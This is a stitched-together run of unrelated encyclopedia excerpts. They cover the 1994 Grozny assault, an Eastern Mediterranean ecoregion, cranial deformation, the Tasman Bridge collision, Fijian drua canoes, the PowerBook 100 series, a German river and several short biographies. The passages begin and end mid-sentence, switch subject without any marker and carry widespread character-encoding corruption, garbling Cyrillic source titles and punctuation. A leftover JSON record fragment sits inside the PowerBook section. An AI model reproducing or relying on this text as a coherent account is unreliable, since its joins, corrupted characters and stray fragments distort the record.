sources give similar figures of about 40‚Äì42 tanks (by one count, 14 of them manned by the Chechen opposition and the rest by Russians–î–µ—Å—è—Ç—å –ª–µ—Ç –ø–æ–∑–æ—Ä–Ω–æ–º—É —à—Ç—É—Ä–º—É –ì—Ä–æ–∑–Ω–æ–≥–æ ), supported from air by six helicopters and six Sukhoi Su-27 air superiority fighters,–°–ø–µ—Ü—Å–ª—É–∂–±—ã —Ä–∞–∑–∂–∏–≥–∞—é—Ç –≤–æ–π–Ω—É –≤ –ß–µ—á–Ω–µ but give much lower figures of no more than 1,000‚Äì1,500 allied Chechen militiamen (including Labazanov's 30 remaining fighters after his militia was defeated at Argun). The attack was met with an improvised but fierce defense by the Chechen government forces and loyalist militias (prominently the battle- hardened Abkhaz Battalion made of veterans of the War in Abkhazia and led by Shamil Basayev) in the city center, including an ambush near the Chechen presidential palace and the fighting at the State Security headquarters, the railway station and the television center. Soon the assault turned into a disaster as the defenders burned or captured most of the attacking armored vehicles, capturing scores of Russian servicemen in the process (mostly after having trapped a large group of them in Kirov Park, Leninsky district), and completely routed the opposition. Casualties * According to Western sources, over 300 people died and the attackers lost most of their vehicles; in addition, four Russian helicopter gunships and one Sukhoi Su-25 close air support aircraft were reportedly downed.Russia's Strategy in Chechnya: A Case Study in Failure, Maxwell Air Force Base Air War College, April 1997.

Aftermath This defeat was catastrophic, not only in military but also in political terms. Any Russian complicity and knowledge of the operation was at first denied by Moscow, but then acknowledged after 20 captured Russian servicemen were paraded before television camerasThe Battle of Grozny: Deadly Classroom for Urban Combat, Parameters, summer 1999. and Dudayev threatened to shoot them if Yeltsin would not recognise his own soldiers.Dudayev Vows to Crush Rebels Amid New Clashes Around Grozny, Agence France-Presse, 27 November 1994. On 1 December, Yeltsin vowed to help the Russian prisoners, the first indirect acknowledgement of Russian involvement. A failure of the coup attempt exhausted Russia's means of waging war against Dudayev by proxy and led to Russia launching an all out direct invasion in December 1994. On 28 November, the Security Council of Russia met in an emergency meeting, adopting a secret decision to prepare a plan for a military operation in Chechnya within 14 days, and Russia's Prime Minister Viktor Chernomyrdin called on for Yeltsin to \\"restore the constitutional order in the Chechen Republic\\". On the same day, a large air strike by the Russian military aviation eliminated every military and civilian aircraft available to Dudayev's government and destroyed the runways at both airfields near Grozny (the Khankala air base and at the Grozny Airport). On 29 November, Yeltsin gave Chechnya 48 hours to disband all \\"illegal armed formations\\", disarm, and release all prisoners. On 10 December 1994, tens of thousands of Russian regulars were ordered to move towards Grozny from Dagestan, Ingushetia and North Ossetia, and the First Chechen War officially began.

It covers portions of Turkey, Syria, Lebanon, Israel, Palestine, Jordan, and Saudi Arabia. The ecoregion has a Mediterranean climate, and is part of the Mediterranean forests, woodlands, and scrub biome. Geography The ecoregion covers an area of . In southern Turkey, it occupies the coastal lowlands between the mountains and the Mediterranean, extending from Antalya to Iskenderun and including the √áukurova plain in between. It then extends eastwards through southern Turkey to where the borders of Iraq, Syria, and Turkey meet, and southwards along the eastern Mediterranean through the Levant ‚Äì western Syria, Lebanon, West Bank, northern Israel, and the Jordanian Highlands. The Druze Mountains in central Syria are an outlier. Isolated mountaintop pockets (Jabal al-Lawz, etc.) are found in the Midian Mountains and Hijaz Mountains of northwestern Saudi Arabia.\\"Eastern Mediterranean conifer-broadleaf forests\\". Ecoregions 2017. Accessed 25 April 2020. The ecoregion is bounded by forest ecoregions to the north in Anatolia, and deserts to the east and south. The ecoregion covers coastal plains, low mountains, and interior plateaus. The higher elevations in the Taurus Mountains to the north, and the Syrian Coastal Mountains, Lebanon Mountains, and Anti-Lebanon Mountains which run parallel to the Eastern Mediterranean coast, are in the Southern Anatolian montane conifer and deciduous forests ecoregion. Several large cities are in the ecoregion, including Adana, Gaziantep, Antalya, and Mersin in Turkey; Aleppo, Homs, Hama, and Latakia in Syria; Beirut and Tripoli in Lebanon; Tel Aviv, Jerusalem, and Haifa in Israel; Gaza, Hebron and Nablus in Palestine; and Amman in Jordan. Climate The ecoregion has a Mediterranean climate, with a mild, rainy winter and hot dry summer. Rainfall varies across the ecoregion. It is generally higher on coastal-facing slopes, ranging from 1,000-1,250 mm annually near Antalya to 650-850 mm in Mersin, Adana, Iskendurun, and coastal Syria and Lebanon. Rainfall is lowest in the eastern and southernmost parts of the ecoregion, with less than 450 mm annually in eastern Anatolia, the interior of Syria, southern Israel and Palestine, and the Jordanian Highlands. Flora Major plant communities in the ecoregion include broadleaf sclerophyllous shrublands (maquis and garrigue), pine forests (chiefly of Turkish pine (Pinus brutia) and Aleppo pine (Pinus halepensis)), and dry oak (Quercus spp.) woodlands and steppes. Turkish pine is more common in the Turkish coastal region, and Aleppo pine in the Levant. Neither pine is found naturally in the eastern Mesopotamian part of the ecoregion. Maquis is found on coastal slopes in southern Anatolia and along the Levantine coast. Maquis is an open-canopied evergreen woodland, with an understory of shrubs, herbs, grasses, and geophytes. The predominant trees are olive (Olea europea), carob (Cerotonia siliqua), Palestine oak (Quercus calliprinos, sometimes classified as Q. coccifera subsp. calliprinos), pistacio (Pistacia terebinthus, sometimes classified as P. palaestina), lentisk (P. lenticus), and Arbutus andrachne. Much of the maquis has been degraded by frequent fires and over-grazing. The eastern and southernmost portions of the ecoregion are mostly low shrubland and grassland with a semi-desert character. Fauna The golden jackal (Canis aureus) has become the top predator in most of the ecoregion. The Caracal (Caracal caracal) can be found in the shrublands and mountains, and wild boar (Sus scrofa) in woodlands and forests. The eastern portion of the ecoregion has scattered populations of spotted hyaena (Hyaena hyaena) and Persian gazelle (Gazella subgutturosa). The large predators lion (Panthera leo), Syrian brown bear (Ursus arctos syriacus), wolf (Canis lupus), and cheetah (Acinonyx jubatus) have been mostly or completely extirpated from over-hunting and habitat loss.Horowitz, Aharon (2014).

It is done by distorting the normal growth of a child's skull by applying force. Flat shapes, elongated ones (produced by binding between two pieces of wood), rounded ones (binding in cloth), and conical ones are among those chosen or valued in various cultures. Typically, the shape alteration is carried out on an infant, as the skull is most pliable at this time. In a typical case, headbinding begins approximately a month after birth and continues for about six months. History Alan Intentional cranial deformation predates written history; it was practised commonly in a number of cultures that are widely separated geographically and chronologically, and still occurs today in a few areas, including Vanuatu.

In Late Antiquity (AD 300‚Äì600), the East Germanic tribes who were ruled by the Huns, the Gepids, Ostrogoths, Heruli, Rugii, and Burgundians adopted this custom. Among the Lombards, the Burgundians and the Thuringians,Herbert Schutz, The Germanic Realms in Pre- Carolingian Central Europe, 400-750, P. Lang, 2000, p. 62. this custom seems to have comprised women only.Tore Ahlb√§ck, The Problem of Ritual, Donner Institute, 1993, p. 279. In western Germanic tribes, artificial skull deformations rarely have been found.Pany, Doris & Karin Wiltschke-Schrotta, \\"Artificial cranial deformation in a migration period burial of Schwarzenbach, Lower Austria,\\" ViaVIAS, no. 2, pp. 18-23, Vienna, AUT: Vienna Institute for Archaeological Science. The practice of cranial deformation was brought to Bactria and Sogdiana by the tribes who created the Kushan Empire. Men with such skulls are depicted in various surviving sculptures and friezes of that time, such as the Kushan prince of Khalchayan., p. 15 In the Americas, the Maya, Inca, and certain tribes of North American natives performed the custom. In North America the practice was known, especially among the Chinookan tribes of the Northwest and the Choctaw of the Southeast. The Native American group known as the Flathead Indians, in fact, did not practise head flattening, but were named as such in contrast to other Salishan people who used skull modification to make the head appear rounder. Other tribes, including both Southeastern tribes like the ChoctawElliott Shaw, 2015, \\"Choctaw Religion,\\" at Overview Of World Religions, Carlisle, CMA, GBR: University of Cumbria Department of Religion and Ethics, see , accessed 1 August 2015.Hudson, Charles (1976). The Southeastern Indians. University of Tennessee Press. p. 31. and Northwestern tribes like the Chehalis and Nooksack Indians, practiced head flattening by strapping the infant's head to a cradleboard. The practice of cranial deformation was also practiced by the Lucayan people of the Bahamas, and it was also known among the Aboriginal Australians. In Africa, the Mangbetu stood out to European explorers because of their elongated heads. Traditionally, babies' heads were wrapped tightly with cloth in order to give them this distinctive appearance. The practice began dying out in the 1950s. Friedrich Ratzel reported in 1896 that deformation of the skull, both by flattening it behind and elongating it toward the vertex, was found in isolated instances in Tahiti, Samoa, Hawaii, and the Paumotu group, and that it occurred most frequently on Mallicollo in the New Hebrides (today Malakula, Vanuatu), where the skull was squeezed extraordinarily flat. Deliberate deformity of the skull, \\"Toulouse deformity\\"; band visible in photograph is used to induce shape change. The custom of binding babies' heads in Europe in the twentieth century, though dying out at the time, was still extant in France, and also found in pockets in western Russia, the Caucasus, and in Scandinavia. The reasons for the shaping of the head varied over time and for different reasons, from aesthetic to pseudoscientific ideas about the brain's ability to hold certain types of thought depending on its shape. In the region of Toulouse (France), these cranial deformations persisted sporadically up until the early twentieth century; however, rather than being intentionally produced as with some earlier European cultures, Toulousian Deformation seemed to have been the unwanted result of an ancient medical practice among the French peasantry known as bandeau, in which a baby's head was tightly wrapped and padded in order to protect it from impact and accident shortly after birth. In fact, many of the early modern observers of the deformation were recorded as pitying these peasant children, whom they believed to have been lowered in intelligence due to the persistence of old European customs.Eric John Dingwall, Eric John (1931) \\"Later artificial cranial deformation in Europe (Ch. 2),\\" in Artificial Cranial Deformation: A Contribution to the Study of Ethnic Mutilations, pp. 46-80, London, GBR:Bale, Sons & Danielsson, see and , both accessed 1 August 2015. Methods and types Deformation usually begins just after birth for the next couple of years until the desired shape has been reached or the child rejects the apparatus.Trinkaus, 1982.Anton and Weinstein, 1999. There is no broadly established classification system of cranial deformations, and many scientists have developed their own classification systems without agreeing on a single system for all forms observed.Hoshower et al., 1995. An example of an individual system is that of E. V. Zhirov, who described three main types of artificial cranial deformation‚Äîround, fronto-occipital, and sagittal‚Äîfor occurrences in Europe and Asia, in the 1940s.E. V. Zhirov (1941). Motivations and theories One modern theory is cranial deformation was likely performed to signify group affiliation,Gerszten and Gerszten, 1995.Tubbs, Salter, and Oaks, 2006. or to demonstrate social status. Such motivations may have played a key role in Maya society, aimed at creating a skull shape that is aesthetically more pleasing or associated with desirable cultural attributes. For example, in the Na'ahai- speaking area of Tomman Island and the south south-western Malakulan (Australasia), a person with an elongated head is thought to be more intelligent, of higher status, and closer to the world of the spirits. lithograph of a fetus in the intrauterine position with the typical Huanca skull shape, which was found in a mummy of a pregnant woman ‚Äì (Lamina VI a.) in the Spanish version of the 'Peruvian Antiquities' (1851)Mariano Eduardo Rivero, Juan Diego de Tschudi: Antig√ºedades Peruanas. Textband. Imprenta Imperial de la Corte y de Estado, Viena 1851, (Digitalisat). Historically, there have been a number of various theories regarding the motivations for these practices. It has also been considered possible that the practice of cranial deformation originates from an attempt to emulate those groups of the population in which elongated head shape was a natural condition. The skulls of some Ancient Egyptians are among those identified as often being elongated naturally and macrocephaly may be a familial characteristic. For example, Rivero and Tschudi describe a mummy containing a foetus with an elongated skull, describing it thus: Lithographs of skulls by J. Basire P. F. Bellamy makes a similar observation about the two elongated skulls of infants, which were discovered and brought to England by a \\"Captain Blankley\\" and handed over to the Museum of the Devon and Cornwall Natural History Society in 1838. According to Bellamy, these skulls belonged to two infants, female and male, \\"one of which was not more than a few months old, and the other could not be much more than one year.\\"Bellamy, P. F.

This ship is known for causing the Tasman Bridge disaster when she collided with pylon 19 of Hobart's giant high concrete arch style Tasman Bridge on the evening of 5 January 1975 at 9.27 pm, resulting in the deaths of 12 people. Ship details Lake Illawarra was built by the Broken Hill Proprietary Company (now BHP) in Whyalla, South Australia. Her keel was laid in June 1956, and she was launched on 28 September 1957. She was delivered from the shipyard on 28 March 1958. Lake Illawarra measured 7,274 GT and 10,380 DWT, with a length of and a beam of . She was powered by a steam turbine that drove a single propeller and gave her a speed of . Collision and sinking Lake Illawarra was loaded with zinc concentrate, for the Electrolytic Zinc Company (more recently known as Zinifex and OZ Minerals) refinery (now run by Nyrstar) at Risdon, about up the River Derwent from the bridge. Just before the impact, Captain Boleslaw Pelc realised as he passed Rosny Point that he was off course, and traveling too fast. He tried to correct the heading, but only managed to bring the bows too far to port (left) and was now heading for the western shore. He urgently counter-corrected, but could not make the opening. Realising he was headed for a collision, he ordered the engines full astern, but the torque from her propeller caused the ship to slide in a broadside movement. She smashed into the 18th and 19th pylons. Model showing the submerged wreck and bridge debris The collision brought down the two support pylons and a section of steel and concrete. There was evening traffic on the bridge, and although no vehicles were on the section that fell, four cars drove off the gap, with five people killed. Two cars stopped on the edge, their occupants able to escape. The section of four-lane highway landed on the ship's deck, sinking her in of water to the south of the bridge. Seven of the ship's crew lost their lives in the accident. The ship and the debris pile were deemed unsafe to move; the ship's oil was pumped out, and the bow was removed at a later date. The wreck is deep enough not to be a navigational hazard. The subsequent Court of Marine Inquiry found that Lake Illawarra was capable of passing beneath the bridge's central navigation span, but the captain instead attempted to pass through one of the eastern spans, due to a combination of strong tidal currents and inattention. The Court found that Pelc had not handled Lake Illawarra in a proper and seamanlike manner, and suspended his master's certificate for six months. A pilot service was introduced in response to the court's findings.

His son Roy was also a footballer. Playing career Born in Hackney, London, Goulden began his career with Chelmsford City, before moving to Leyton and then West Ham United in 1933. He remained with the Hammers for six years, making over 250 appearances and scoring 55 goals from the inside- left position. He was an ever-present, along with Joe Cockroft, during the 1936‚Äì37 season. Goulden also won 14 England caps during his time at Upton Park. During a match against Germany in 1938, he scored with a shot that reportedly ripped the net from the crossbar; he is then reported to have shouted, \\"Let 'em salute that one!\\" His West Ham career was interrupted when World War II started and he never played another competitive match for the club, though he did win the Football League War Cup with them in 1940. Following the conflict, he signed with west Londoners Chelsea for ¬£4,500 and linked up well with fellow new signings Tommy Lawton and Tommy Walker ‚Äì the trio scored 47 goals between them in 1946‚Äì47 ‚Äì though the side failed to make to challenge for honours, coming closest in the FA Cup, when they lost to Arsenal in the semi-finals, despite having led 2‚Äì0. Goulden retired as a player in 1950, having made 111 Chelsea appearances and scored 17 goals. Coaching and management He remained at Chelsea until 1952, before moving to Hertfordshire in November 1952 for a management opportunity at Watford. His first match in charge was a 1‚Äì1 draw at home to Coventry, and by the end of 1952‚Äì53 Goulden had guided his team to a top-10 finish in the Third Division South. That summer he signed Dave Bewley, Roy Brown and Maurice Cook, all of whom went on to play key roles during his reign. After guiding Watford to 4th and 7th in the next two campaigns, Goulden stepped down to become a coach midway through the 1955‚Äì56 season. However, his successor and former player Johnny Paton's spell yielded just 2 wins from 15 games, including defeat at the hands of non-league clubs Aldershot and Bedford Town. Goulden took over for the remainder of the season, but was only able to salvage a 21st-placed finish. After three years coaching overseas, Goulden returned to Watford in 1959, as part of new manager Ron Burgess's coaching staff. Burgess and Goulden's impact was immediate; Watford won promotion from the Fourth Division in 1960, and very nearly a second consecutive promotion in 1961. Goulden departed the following season, again coaching overseas, before returning to management in England with Banbury United in 1965. Goulden, assisted by his former player Maurice Cook, helped Banbury reach the Southern League for the first time in their history. After leaving in 1967, Goulden's final role in football came at Oxford United, where he managed the reserve team from 1969. Goulden died on 14 February 1995, in Plaistow, London.

Druas do not tack but rather shunt (stern becomes the bow and vice versa). Both ends of each hull are identical, but the hulls are of different sizes and the smaller one is always sailed to windward. The main differences, compared to proas, are that the hulls have a symmetric U-form profile, and a second hull is used instead of an outrigger. When a float (cama) is used in place of the smaller hull, the craft is called a camakau. > The Fijian double canoe (wangga ndrua, spelt waqa drua in Fijian) was the > largest and finest sea-going vessel ever designed and built by natives of > Oceania before contact with Europeans. :‚Äî Canoes of Oceania Volume I: The > Canoes of Polynesia, Fiji, and Micronesia Druas were large, up to long, and could carry more than 200 people. Despite being called \\"canoes\\", they were not dugouts, but plank-built ships. Origins Fijian drua (1913) No written record exists of the diffusion of the drua design, but most anthropologists assume its origin in Micronesia, and it probably came to Fiji through the islands of Kiribati and Tuvalu. The only shunting boat type of Polynesian design is the Pahi of the Tuamotu archipelago, but it uses equal hulls and does not appear to be related to other proas. From Fiji, druas spread to Tonga (where they are called Kalia) and Samoa (where they are called 'Alia). Captain Cook visited Tonga in his second and third voyages, and noticed that druas were rapidly displacing the Polynesian catamaran design. Tongan chiefs taking part in Fijian wars would bring them back as prizes of war. Drua construction eventually became a monopoly of Tongan shipbuilders living in the Fijian Lau Islands. War canoes Druas were sacred canoes in the sense that only aristocrats could own one. Their main role was as war ships, taking part in naval battles and transporting warriors during raids. They also had a representative role, and were used to collect taxes. Following Fijian custom, it was an insult to cross her bows, or to sail to her windward, where the mast stay could be easily cut bringing down the sail. It was also custom to paddle and not to sail in sight of another chief's territory. Launching a drua required a bloody ritual, including human sacrifices. With regard to the human sacrifice associated with the launching ceremonies, Wilkes (1985, vol. 3, p. 97) records that when Tanoa launched a canoe 10 or more men were slaughtered on the deck in order that it might be washed with human blood. Wall (1916) also says: > A new canoe was launched over men's bodies that mana might enter into it and > make it swift and safe, but I can find no trace of living men ever having > been used for this purpose; they were clubbed first. Certain small islands > and districts enjoyed by hereditary right the doubtful honour of supplying > the victims for these occasions, as for instance the island of Laucala for > the launching of the vessels of the Cakaundrove chiefs. Sailing performance Drua racing in Fiji (c. 1920) The speed of druas became a legendary topic for western sailors, who sometimes confused \\"Fijian canoes\\" with \\"flying proas\\" (the latter being the original Micronesian design). The low freeboard of the hulls outside the central platform predates the \\"wave-piercing\\" bows of modern racing designs. The one course that could not be sailed, was with the wind directly aft; otherwise her bows would be driven underwater. Her performance upwind is unclear, with some authors claiming it to be fast and close to the wind, and others describing it as making too much leeway with the wind in the quarter. The steering oars were massive, and big canoes would carry one at each end because they were too heavy to transport to the other side while shunting. The steersman (or men) risked being crippled or killed when hitting big waves. The chief used to stand on the platform's top, being responsible for cutting the sheet to avoid capsizing. Heritage \\"The disappearance of the double canoe of Fiji coincided with the close of the nineteenth century. Few if any were constructed after 1883, the year of the death of King Cakobau, for his grandson, Ratu Popi, informed me that the king's sons two or three years later broke his double canoes to pieces and buried them in a swamp that they may be preserved and kept from being used by anyone else\\" According to some sources, the last Fijian ndrua was built in 1943 on the island of Ongea and was intended to carry copra. Only two original druas appear to have survived, both of them small. One, named Sema Makawa, is in the New Zealand Maritime Museum. The second one is Ratu Finau, at the Fiji Museum in Suva. A new Drua, the i Vola Sigavou, was completed in 2016 and launched at Navua in Serua province on Viti Levu Fiji's main island.

In October 1991, Apple released the first three PowerBooks: the low-end PowerBook 100, the more powerful PowerBook 140, and the high end PowerBook 170, the only one with an active matrix display. These machines caused a stir in the industry with their compact dark grey cases, use of a trackball, and the clever positioning of the keyboard which left room for palmrests on either side of the pointing device. Portable PC computers at the time tended to have the keyboard forward towards the user, with empty space behind it, so this was a surprising innovation and set the standard layout all future notebook computers would follow. The PowerBook 140 and 170 were the original PowerBook designs, while the PowerBook 100 was the result of Apple having sent the schematics of the Mac Portable to Sony, who miniaturized the components. Hence the PowerBook 100's design does not match those of the rest of the series, as it was actually designed after the 140 & 170 and further benefited from improvements learned during their development. The PowerBook 100, however, did not sell well until Apple dropped the price substantially. Both the 100 and 200 series PowerBooks were intended to tie into the rest of the Apple desktop products utilizing the corporate Snow White design language incorporated into all product designs since 1986. However, unlike the Macintosh Portable which was essentially a battery-powered desktop in weight and size, the light colors and decorative recessed lines did not seem appropriate for the scaled down designs. In addition to adopting the darker grey colour scheme which co-ordinated with the official corporate look, they also adopted a raised series of ridges mimicking the indented lines on the desktops. The innovative look not only unified their entire product line, but set Apple apart in the marketplace and had the added benefit of masking fingerprints while the ridges provided added traction with which to grip the PowerBook. These early series would be the last to utilize the aging Snow White look, with the 190 adopting a new look along with the introduction of the 500 series. \\"Kunkel, Paul, AppleDesign: The work of the Apple Industrial Design Group, with photographs by Rick English, New York: Graphis, 1997, p.30 The first series of PowerBooks were hugely successful, capturing 40% of all laptop sales. Despite this, the original team left to work at Compaq, setting back updated versions for some time. When increasing processing power, Apple was hampered by the overheating problems of the 68040; this resulted in the 100-series PowerBook being stuck with the aging 68030 which could not compete with newer-generation Intel 80486-based PC laptops introduced in 1994. For several years, new PowerBook and PowerBook Duo computers were introduced which featured incremental improvements, including color screens, but by mid-decade, most other companies had copied the majority of the PowerBook's features, and Apple was unable to regain their lead. The original PowerBook 100, 140, and 170 were replaced by the 145 (updated to the 145B in 1993), 160, and 180 in 1992, with the 160 and 180 having video output allowing them to drive an external monitor. The PowerBook 180 had a superb-for-the-time active-matrix grayscale display, making it popular. In 1993, the PowerBook 165c was the first PowerBook with a color screen, later followed by the 180c. In 1994, the last true member of the 100-series form factor introduced was the PowerBook 150, targeted at value-minded consumers and students. The PowerBook 190, released in 1995, bears no resemblance to the rest of the PowerBook 100 series, and is in fact simply a Motorola 68LC040-based version of the PowerBook 5300, and the last PowerBook model to be manufactured using a Motorola 68k-family processor). However, like the 190, the 150 also used the 5300 IDE-based logic-board architecture. From the 100's 68000 processor, to the 190's 68LC040 processor, the 100 series PowerBooks span the entire Apple 68K line, with the 190 even upgradable to a PowerPC processor. The PowerBook Duo spanned the 68030 line of processors and sold through the PowerPC transition to the PowerPC 603e processor with the 2300, also based on the 5300's internal architecture. In February 2005, Mobile PC magazine named the PowerBook 100 its choice as the \\"#1 gadget of all time.\\" References External links *Apple-History 100 Category:Computer-related introductions in 1991 cs:PowerBook de:Apple PowerBook es:PowerBook fr:PowerBook ko:ÌååÏõåÎ∂Å id:PowerBook it:Famiglia PowerBook nl:Apple PowerBook ja:PowerBook no:PowerBook pl:PowerBook ru:PowerBook simple:PowerBook sk:PowerBook fi:PowerBook sv:Powerbook zh:PowerBook ","title":"PowerBook 100 series"},{"id":"8098043","title":"ALGOL Bulletin"},{"id":"8098048","text":"Triumph Records was an American record label, founded in 1958 when Herb Abramson left Atlantic Records, but the label only existed for a short time.

It is Rea's most successful studio album, topping the UK Albums Chart for three weeks, and was certified 6x Platinum by BPI until 2004. The second part of the two-part title track, \\"The Road to Hell (Pt. 2)\\", is also one of Rea's most famous songs. Summary Rea recalls that he had a lot of trouble with the album due to the record company, and \\"recorded the next album ‚Äì Auberge ‚Äì before, as an agreement with Warner Brothers. So if Road To Hell didn‚Äôt work ‚Äì and they said it won't ‚Äì we would jump straight away to Auberge and forget about it. Of course, the beginning to \\"Road To Hell\\" is a gospel blues thing. Warner Brothers went, ‚ÄòThis is going to be over in five minutes‚Äô. But I did stand me ground, and it went No.1\\". The song \\"Texas\\" has been played through the years on Classic Rock/AOR radio stations in Texas, and is sometimes played as background music before Texas Rangers baseball games at Rangers Ballpark in Arlington. Another track, \\"Daytona\\", is about the Ferrari 365 GTB/4 \\"Daytona\\", in which he sings about the car metaphorically, with the engine and tyre noise from the car ringing out toward the end of the song. Also, the song \\"Tell Me There's a Heaven\\" was used in a 1991 public information film for the NSPCC.

It is a right-bank tributary of the River Eider. It starts in northern Angeln, southeast of Flensburg, and flows mainly south- south-west before joining the Eider near Friedrichstadt. The upper course is called Bondenau. Its source is situated in the ground of Mohrkirch.Digitaler Atlas Nord (official mapserver of Schleswig-Holstein state), showing the onset of Treene river, but not the very sourceEnvironment dates of Schleswig- Holstein state ‚Üí Gew√§ssernetz (network of waterbodies), R=3547103 H=6063176 The name 'Treene' begins at the Tresssee lake near Gro√üsolt in the district of Schleswig-Flensburg. After about it reaches the town of Friedrichstadt (in Nordfriesland district).Stream gauge at Friedrichstadt There it is released through valves into the estuary of the Eider, above the Eider Barrage. It is the most important tributary of Eider river. Since the construction of Kiel Canal, it is even stronger than Eider river itself. Details The Bondenau, as the main headstream of the Treene, rises east of the Tressee on the peninsula of Angeln, bounded by the Flensburger F√∂rde and the Schlei. So the Treene is an unusual case of a river that rises on a peninsula in the Baltic Sea, but flows into the North Sea. The length of Bondenau is . Half a kilometer before the Tre√üsee (Lake Tress), it is joined by a stream named Kielstau or Kielsau, by some people considered another headstream of Treene river. Between the Tre√üsee and T√ºdal, there is a natural reserve covering an area of called Obere Treenelandschaft that extends along the river. Especially the lower part is a retreat area for migratory birds (\\"stork village\\" Bergenhusen). The middling section between Langstedt and Treia developed to be a popular canoe district, the lower section can be used by pleasure crafts as well. In Schwabstedt, there is a public swimming site in the river. History From antiquity to High Middle Ages, the strip of dry land between Treene wetlands and Schlei had the function of an isthmus. Here the Danevirke secured the south border of Denmark, which at that time was marked by the Eider, more than further south. And the route Eider - Treene - Rheider Au (tributary of the Treene) - Schlei served as a shipping route between the North Sea and Baltic Sea (see also Haithabu). Whether thereby boats were pulled between Selker Noor (an extension of Schlei inlet) and the Rheider Au on primitive rollers over the 20 m high land ridges (usual opinion), or whether the Kograben, 1 to 2 km south of and parallel to the walls of Danevirke, also served as a shipping canal, has not yet finally been clarified.

His Whitman: An Interpretation in Narrative (1926) was the first biography of a literary figure to win the Pulitzer Prize for Biography or Autobiography in 1927. Life Holloway received his A.B. from Hendrix College in 1906 and his M.A. from the University of Texas in 1912, where he subsequently taught for a year. While completing further graduate study at Columbia University during the 1913-1914 academic year, his interest in Whitman was encouraged by John Erskine, causing him to author the Whitman essay for The Cambridge History of English and American Literature. Holloway became an instructor at Adelphi College in 1914 and was promoted to assistant professor in 1916. During World War I, he was a transportation secretary with the American Expeditionary Force in France and taught at the A.E.F. University in Beaune for one year. Returning to Adelphi, he became professor of English in 1919 and remained there until 1937, when he joined the original faculty of Queens College as a professor of American literature and chair of the English department; in 1954, he retired from teaching and became professor emeritus. He continued to live in Brooklyn, New York until moving in with his son in Coopersburg, Pennsylvania several months before his death. The Uncollected Poetry and Prose of Walt Whitman (2 vols.) (1921), which took seven years established Holloway's reputation. His work resulted in a comprehensive body of resource materials and brought a much clearer understanding of Whitman's private thought and personal relationships, revealing his creative process. Whitman: An Interpretation in Narrative (1926) pioneered the use of cinema-style narrative techniques in a biography, making it popular with the general public. In Whitman as a Subject for Biography (1974), Holloway says about it: \\"My aim was to present an interpretation through a method primarily narrative, yet relying heavily on Whitman's self- revelations.\\" Free and Lonesome Heart: The Secret of Walt Whitman (1960) is a reply to critics who had charged him with ignoring evidence of Whitman's sexual orientation and behavior, laying out the controversy surrounding Whitman's \\"simple homosexual\\" disposition in the context of the disputed interpretation of \\"Once I Passed Through a Populous City\\", developing an extensive apologetic on Whitman's use of paradox and on the necessity for a poet to embody both male and female natures: \\"The key word in the comprehension of Whitman is 'balance'.\\" Holloway's last biographical work, Portrait of a Poet: The Life of Walt Whitman, was considered too lengthy for publication; it was ultimately deposited by Holloway in the Berg Collection of the New York Public Library in 1962. The manuscript repeats much of the argument of Free and Lonesome Heart and includes detailed appendices supporting his positions. Holloway died in 1977.

Freeman played on his varsity football team all four years he was in high school. He was a SuperPrep All-American and was rated the No. 2 quarterback in the nation and the No. 3 overall prospect in Texas by SuperPrep. Freeman was selected to the Elite 11 where the top 11 quarterbacks across the nation traveled to Southern California to compete and work with Coach Bob Johnson. Going into his senior football season at Brownwood, Freeman was considered arguably the best quarterback in the country. Fellow Texan, Rhett Bomar of Grand Prairie and Freeman were the most touted quarterbacks of the 2004 NCAA signing class. Freeman was named the second best quarterback in the country by the recruiting services Rivals.com and Scout.com Freeman was a Nike All-American, EA Sports Elite 11 selection, SuperPrep All-American, & selected to play in the Army All-American Bowl but declined due to early high school graduation and early enrollment at the University of Miami.

She was one of the most notable female artists in Canada in the early twentieth century and achieved considerable internal success during her decade-long career. McNicoll played an important role in popularizing Impressionism in Canada, at a time when it was still relatively unknown, with her lively representations of rural landscapes, intimate child subjects and modern female figures. She was elected to the Royal Society of British Artists in 1913 and the Royal Canadian Academy of Arts in 1914. Biography  Early life  McNicoll was born in Toronto to an affluent family. Her parents were David McNicoll and Emily Pashley who were British immigrants. McNicoll had six siblings‚Äîthree sisters and three brothers‚Äîwith letters and sketches proving that the McNicoll family was very close. McNicoll‚Äôs parents were members of Montreal‚Äôs Anglophone Protestant Elite. Her father David worked in the Railway industry in Scotland and England, allowing Helen to come into close contact with prominent families during the boom of Industrialism. McNicoll, with the financial support of her family through connections with renowned art collectors, would be able to freely paint without worry. McNicoll's first exposure to art presumably came from observing her parents--her father did sketches during his railway travels while her mother painted china and wrote poetry. Despite the advantages, McNicoll developed severe hearing loss at the age of two due to scarlet fever. McNicoll navigated the social side of the art world through lip reading and assistance from friends and family. In 1899, she participated in activities at the Mackay Institution for Protestant Deaf Mutes; however, she was not listed in official school records and was not listed as deaf in the 1901 census due to misunderstandings of deaf culture in North America at this time.  Education and career  From 1902 to 1904 McNicoll moved to London to study at the Slade School of Fine Art under Philip Wilson Steer; it is also here that McNicoll meets her lifelong partner Dorothea Sharp. Students were encouraged to paint with a naturalistic approach using en plein air. McNicoll then moved to England to study at St. Ives in Cornwall. In 1905, she attended Julius Olsson's School of Landscape and Marine Painting under Algernon Talmage. McNicoll then began her formal art education at the Art Association of Montreal in 1906, a school with a progressive approach to teaching art by allowing female students to study the nude figure. She began to study under William Brymner, one of the first Canadian artists to study in Paris between 1878 and 1880. As a director of the AAM school, Brymner also encouraged French art trends such as plein air, naturalism, and impressionism in academics. McNicoll was impacted by Brymner as he also encouraged women artists to pursue professional careers. McNicoll made her debut exhibiting six paintings at annual exhibition at the AAM; she also exhibited with the Royal Canadian Academy of Arts and the Ontario Society of Artists from 1906 to 1914. McNicoll maintained a studio in London while she traveled around Europe from 1908 up until her death.  World War I  McNicoll and Sharp were working in France when the first World War broke out. McNicoll had written to her father saying that they \\"would rather be here than anywhere\\", however due to McNicoll's ties to the Canadian Pacific Railway through her father, she was sent home.  Personal life  While studying at the Slade School, McNicoll met British painter Dorothea Sharp with whom she formed a lifelong bond with, nicknaming each other \\"Nellie\\" and \\"Dolly\\". The two women traveled together, shared studio spaces, and posed for each other's paintings. In McNicoll's case, having a companion was especially helpful due to obstacles she must have faced due to her hearing loss. McNicoll relied on Sharp's skills in negotiating with models--specifically children, into posing. In The Chintz Sofa by McNicoll, Sharp is depicted in their shared London studio.  Death and legacy  McNicoll died in Swanage, Dorset, at the early age of thirty-six due to complications from diabetes in 1915. An obituary described her as \\"one of the most profoundly original and technically accomplished of Canadian artists.\\" McNicoll had contributed more than 70 works to exhibitions in both Canada and Britain. Her work would continue to be praised into the 1920s , with the AAM organizing a memorial exhibition of 150 of her 